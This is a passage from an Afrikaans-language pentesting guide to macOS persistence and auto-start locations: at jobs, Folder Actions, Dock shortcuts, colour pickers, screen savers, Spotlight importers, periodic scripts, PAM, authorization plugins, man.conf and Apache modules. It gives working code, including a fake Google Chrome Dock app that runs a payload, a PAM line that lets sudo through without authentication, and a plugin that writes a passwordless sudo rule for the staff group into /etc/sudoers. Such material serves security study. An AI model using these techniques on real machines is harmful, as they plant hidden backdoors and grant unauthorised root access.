Hierbo kan ons twee geskeduleerde take sien. Ons kan die besonderhede van die taak druk met `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> As AT tasks nie geaktiveer is nie, sal die geskepte take nie uitgevoer word nie.

Die **job files** kan gevind word by `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Die lêernaam bevat die queue, die job number, en die tyd waarop dit geskeduleer is om te hardloop. Byvoorbeeld, kom ons kyk na `a0001a019bdcd2`.

- `a` - this is the queue
- `0001a` - job number in hex, `0x1a = 26`
- `019bdcd2` - time in hex. It represents the minutes passed since epoch. `0x019bdcd2` is `26991826` in decimal. If we multiply it by 60 we get `1619509560`, which is `GMT: 2021. April 27., Dinsdag 7:46:00`.

As ons die job-lêer uitdruk, vind ons dat dit dieselfde inligting bevat wat ons met `at -c` gekry het.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet `osascript` met argumente kan aanroep om kontak te maak met **`System Events`** om Folder Actions te kan konfigureer
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Dit het sommige basiese TCC-permissies soos Desktop, Documents en Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Root benodig
- **Trigger**: Toegang tot die gespesifiseerde vouer
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Toegang tot die gespesifiseerde vouer

#### Description & Exploitation

Folder Actions is skripte wat outomaties geaktiveer word deur veranderings in 'n vouer, soos die byvoeging of verwydering van items, of ander aksies soos die opening of verander van die vouer-venster se grootte. Hierdie aksies kan vir verskeie take gebruik word en kan op verskillende maniere geaktiveer word, byvoorbeeld deur die Finder UI of terminal commands.

Om Folder Actions in te stel, het jy opsies soos:

1. Opstel van 'n Folder Action-workflow met [Automator](https://support.apple.com/guide/automator/welcome/mac) en dit as 'n diens installeer.
2. Handmatig 'n skrip heg via die Folder Actions Setup in die konteks-kieslys van 'n folder.
3. Gebruik OSAScript om Apple Event boodskappe na die `System Events.app` te stuur vir programmaties opstel van 'n Folder Action.
- Hierdie metode is veral nuttig om die aksie in die stelsel in te bed, wat 'n vlak van persistensie bied.

Die volgende skrip is 'n voorbeeld van wat deur 'n Folder Action uitgevoer kan word:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Om die bostaande script bruikbaar te maak vir Folder Actions, kompileer dit met:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Nadat die script saamgestel is, stel Folder Actions in deur die onderstaande script uit te voer. Hierdie script sal Folder Actions wêreldwyd aktiveer en spesifiek die vooraf saamgestelde script aan die Desktop-folder koppel.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Voer die setup-skrip uit met:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Dit is die manier om hierdie persistensie via die GUI te implementeer:

Hierdie is die skrip wat uitgevoer sal word:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Kompileer dit met: `osacompile -l JavaScript -o folder.scpt source.js`

Skuif dit na:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Then, open the `Folder Actions Setup` app, select the **folder you would like to watch** and select in your case **`folder.scpt`** (in my case I called it output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Now, if you open that folder with **Finder**, your script will be executed.

This configuration was stored in the **plist** located in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in base64 format.

Now, lets try to prepare this persistence without GUI access:

1. **Copy `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** to `/tmp` to backup it:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Verwyder** die Folder Actions wat jy net ingestel het:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Now that we have an empty environment

3. Kopieer die rugsteunlêer: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Maak die Folder Actions Setup.app oop om hierdie konfigurasie te gebruik: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> En dit het vir my nie gewerk nie, maar dit is die instruksies uit die writeup:(

### Dock-snelkoppelinge

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
- But you need to have installed a malicious application inside the system
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: When the user clicks on the app inside the dock

#### Beskrywing & Exploitation

All the applications that appear in the Dock are specified inside the plist: **`~/Library/Preferences/com.apple.dock.plist`**

It's possible to **add an application** just with:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Deur 'n bietjie **social engineering** te gebruik, kan jy **byvoorbeeld Google Chrome naboots** in die dock en eintlik jou eie script uitvoer:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Kleurkiesers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Nuttig om sandbox te bypass: [🟠](https://emojipedia.org/large-orange-circle)
- ’n Baie spesifieke aksie moet plaasvind
- Jy sal in ’n ander sandbox eindig
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/Library/ColorPickers`
- Root vereis
- Trigger: Use the color picker
- `~/Library/ColorPickers`
- Trigger: Use the color picker

#### Beskrywing & Exploit

**Compile a color picker** bundle met jou kode (you could use [**this one for example**](https://github.com/viktorstrate/color-picker-plus)) en voeg ’n constructor by (soos in die [Screen Saver section](macos-auto-start-locations.md#screen-saver)) en kopieer die bundle na `~/Library/ColorPickers`.

Wanneer die kleurkieser geaktiveer word, behoort jou kode ook uit te voer.

Let wel dat die binary wat jou biblioteek laai ’n **baie beperkende sandbox** het: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Verslag**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Verslag**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Nuttig om die sandbox te omseil: **Nee, omdat jy jou eie app moet uitvoer**
- TCC-omseiling: ???

#### Ligging

- 'n spesifieke app

#### Beskrywing & Uitbuiting

'n toepassingsvoorbeeld met 'n Finder Sync Extension [**is hier te vind**](https://github.com/D00MFist/InSync).

Toepassings kan `Finder Sync Extensions` hê. Hierdie uitbreiding sal binne 'n toepassing geplaas word wat uitgevoer sal word. Verder, sodat die uitbreiding sy kode kan uitvoer, moet dit **signed** wees met 'n geldige Apple developer certificate, dit moet **sandboxed** wees (alhoewel relaxed exceptions bygevoeg kan word) en dit moet geregistreer wees met iets soos:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy sal in 'n algemene application sandbox beland
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/System/Library/Screen Savers`
- Root vereis
- **Trigger**: Kies die Screen Saver
- `/Library/Screen Savers`
- Root vereis
- **Trigger**: Kies die Screen Saver
- `~/Library/Screen Savers`
- **Trigger**: Kies die Screen Saver

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Beskrywing & Exploit

Skep 'n nuwe projek in Xcode en kies die template om 'n nuwe **Screen Saver** te genereer. Voeg dan jou kode by dit, byvoorbeeld die volgende kode om logs te genereer.

**Build** dit, en kopieer die `.saver` bundle na **`~/Library/Screen Savers`**. Daarna, open die Screen Saver GUI en as jy net daarop klik, behoort dit 'n klomp logs te genereer:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Let wel dat omdat binne die entitlements van die binary wat hierdie kode laai (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) jy **`com.apple.security.app-sandbox`** kan vind, sal jy **binne die algemene application sandbox** wees.

Saver-kode:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

skryftoelichting: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Nuttig om die sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy sal in 'n application sandbox beland
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Die sandbox lyk baie beperk

#### Ligging

- `~/Library/Spotlight/`
- **Trigger**: 'n nuwe lêer met 'n uitbreiding wat deur die Spotlight-plugin bestuur word, word geskep.
- `/Library/Spotlight/`
- **Trigger**: 'n nuwe lêer met 'n uitbreiding wat deur die Spotlight-plugin bestuur word, word geskep.
- Root required
- `/System/Library/Spotlight/`
- **Trigger**: 'n nuwe lêer met 'n uitbreiding wat deur die Spotlight-plugin bestuur word, word geskep.
- Root required
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: 'n nuwe lêer met 'n uitbreiding wat deur die Spotlight-plugin bestuur word, word geskep.
- New app required

#### Beskrywing & Eksploitasie

Spotlight is macOS se ingeboude soekfunksie, ontwerp om gebruikers van **vinnige en omvattende toegang tot data op hul rekenaars** te voorsien.\
Om hierdie vinnige soekvermoë te fasiliteer, onderhou Spotlight 'n **proprietêre databasis** en skep 'n indeks deur die meeste lêers te **ontleed**, wat vinnige soektogte deur beide lêernaam en hul inhoud moontlik maak.

Die onderliggende meganisme van Spotlight betrek 'n sentrale proses met die naam 'mds', wat staan vir **'metadata server.'** Hierdie proses orkestreer die hele Spotlight-diens. Aanvullend hierop is daar verskeie 'mdworker' daemons wat 'n verskeidenheid onderhoudstake uitvoer, soos die indeksering van verskillende lêertipes (`ps -ef | grep mdworker`). Hierdie take word moontlik gemaak deur Spotlight importer plugins, of **`.mdimporter` bundles**, wat Spotlight in staat stel om inhoud oor 'n uiteenlopende reeks lêerformate te verstaan en te indekseer.

Die plugins of **`.mdimporter`** bundles is geleë op die plekke hierbo genoem en as 'n nuwe bundle verskyn, word dit binne minute gelaai (geen behoefte om 'n diens te herbegin nie). Hierdie bundles moet aandui watter **lêertipe en uitbreidings hulle kan hanteer**, sodoende sal Spotlight hulle gebruik wanneer 'n nuwe lêer met die aangeduide uitbreiding geskep word.

Dit is moontlik om **al die `mdimporters`** wat gelaai en aan die loop is, te vind deur:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
En byvoorbeeld **/Library/Spotlight/iBooksAuthor.mdimporter** word gebruik om hierdie tipe lêers te ontleed (uitbreidings `.iba` en `.book` onder andere):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> As jy die Plist van ander `mdimporter` nagaan sal jy moontlik nie die inskrywing **`UTTypeConformsTo`** vind nie. Dit is omdat dit 'n ingeboude _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) is en dit hoef nie uitbreidings te spesifiseer nie.
>
> Verder het stelsel-standaard plugins altyd voorrang, so 'n aanvaller kan slegs toegang kry tot lêers wat nie andersins deur Apple's eie `mdimporters` geïndekseer word nie.

Om jou eie importer te skep kan jy begin met hierdie projek: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) en dan die naam, die **`CFBundleDocumentTypes`** verander en **`UTImportedTypeDeclarations`** byvoeg sodat dit die uitbreiding wat jy wil ondersteun, ondersteun en dit in **`schema.xml`** weerkaats.\
Verander daarna die kode van die funksie **`GetMetadataForFile`** om jou payload uit te voer wanneer 'n lêer met die verwerkte uitbreiding geskep word.

Bou uiteindelik jou nuwe `.mdimporter` en kopieer dit na een van die drie vorige lokasies en jy kan nagaan of dit gelaai is deur die logs te monitor of deur **`mdimport -L`** te kontroleer.

### ~~Preference Pane~~

> [!CAUTION]
> Dit lyk nie of dit nog werk nie.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Dit benodig 'n spesifieke gebruikersaksie
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Dit lyk nie of dit nog werk nie.

## Root Sandbox Bypass

> [!TIP]
> Hier kan jy beginlokasies vind wat nuttig is vir **sandbox bypass** wat jou toelaat om eenvoudig iets uit te voer deur dit **in 'n lêer te skryf** terwyl jy **root** is en/of wat ander **vreemde toestande** vereis.

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Benodig root
- **Trigger**: Wanneer die tyd aanbreek
- `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local`
- Benodig root
- **Trigger**: Wanneer die tyd aanbreek

#### Description & Exploitation

Die periodic-skripte (**`/etc/periodic`**) word uitgevoer as gevolg van die **launch daemons** wat in `/System/Library/LaunchDaemons/com.apple.periodic*` gekonfigureer is. Let daarop dat skripte wat in `/etc/periodic/` gestoor word **uitgevoer** word as die **eienaar van die lêer,** so dit sal nie werk vir 'n moontlike privilege escalation nie.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Daar is ander periodieke skripte wat uitgevoer sal word soos aangedui in **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
As jy daarin slaag om enige van die lêers `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local` te skryf, sal dit **uiteindelik uitgevoer word**.

> [!WARNING]
> Let daarop dat die periodieke skrip **as die eienaar van die skrip uitgevoer sal word**. Dus, as 'n gewone gebruiker die skrip besit, sal dit as daardie gebruiker uitgevoer word (dit kan privilege escalation attacks voorkom).

### PAM

Skryfbeskrywing: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Skryfbeskrywing: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Root altyd vereis

#### Beskrywing & Exploitation

Aangesien PAM meer gefokus is op **persistence** en malware as op maklike uitvoering binne macOS, gaan hierdie blog nie 'n gedetaileerde verduideliking gee nie — **lees die writeups om hierdie tegniek beter te verstaan**.

Kontroleer PAM modules met:
```bash
ls -l /etc/pam.d
```
'n persistence/privilege escalation technique abusing PAM is so eenvoudig soos om die module /etc/pam.d/sudo te wysig en aan die begin die volgende reël by te voeg:
```bash
auth       sufficient     pam_permit.so
```
Dit sal **so lyk**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
En daarom sal enige poging om **`sudo` sal werk**.

> [!CAUTION]
> Let wel dat hierdie gids deur TCC beskerm word, dus is dit hoogs waarskynlik dat die gebruiker 'n prompt sal kry wat vir toegang vra.

Nog 'n goeie voorbeeld is su, waar jy kan sien dat dit ook moontlik is om parameters aan die PAM modules te gee (en jy kan hierdie lêer ook backdoor):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees en ekstra configs maak
- TCC bypass: ???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
- Root vereis
- Dit is ook nodig om die authorization database te konfigureer om die plugin te gebruik

#### Description & Exploitation

Jy kan 'n authorization plugin skep wat uitgevoer sal word wanneer 'n gebruiker aanmeld om persistence te behou. Vir meer inligting oor hoe om een van hierdie plugins te skep, kyk na die vorige writeups (en wees versigtig — 'n swak geskrewe een kan jou uitslot en jy sal jou Mac vanuit recovery mode moet skoonmaak).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Skuif** die bundel na die ligging wat gelaai sal word:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Voeg uiteindelik die **reël** by om hierdie Plugin te laai:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Die **`evaluate-mechanisms`** sal die autorisasie-raamwerk vertel dat dit 'n eksterne meganisme vir autorisasie moet aanroep. Boonop sal **`privileged`** veroorsaak dat dit as root uitgevoer word.

Roep dit aan met:
```bash
security authorize com.asdf.asdf
```
En dan moet die **staff-groep moet sudo toegang hê** (lees `/etc/sudoers` om te bevestig).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Nuttig om sandbox te bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees en die gebruiker moet man gebruik
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
- Root benodig
- **`/private/etc/man.conf`**: Wanneer man gebruik word

#### Beskrywing & Exploit

Die config-lêer **`/private/etc/man.conf`** dui die binary/script aan wat gebruik word wanneer man-dokumentasie geopen word. Dus kan die pad na die executable gewysig word sodat elke keer as die gebruiker man gebruik om docs te lees 'n backdoor uitgevoer word.

Byvoorbeeld stel in **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
En skep dan `/tmp/view` soos:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Verslag**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees en apache moet loop
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd het geen entitlements nie

#### Ligging

- **`/etc/apache2/httpd.conf`**
- Root vereis
- Trigger: Wanneer Apache2 gestart word

#### Beskrywing & Exploit

Jy kan in `/etc/apache2/httpd.conf` aandui om 'n module te laad deur 'n reël soos die volgende by te voeg:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Op hierdie manier sal jou gekompileerde module deur Apache gelaai word. Die enigste ding is dat jy óf dit moet **onderteken met 'n geldige Apple-sertifikaat**, óf jy moet 'n **nuwe vertroude sertifikaat** in die stelsel byvoeg en dit daarmee **onderteken**.

Indien nodig, om te verseker dat die bediener begin, kan jy die volgende uitvoer:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Kodevoorbeeld vir die Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Nuttig om sandbox te bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees, auditd moet aan die gang wees en 'n waarskuwing veroorsaak
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/etc/security/audit_warn`**
- Benodig root
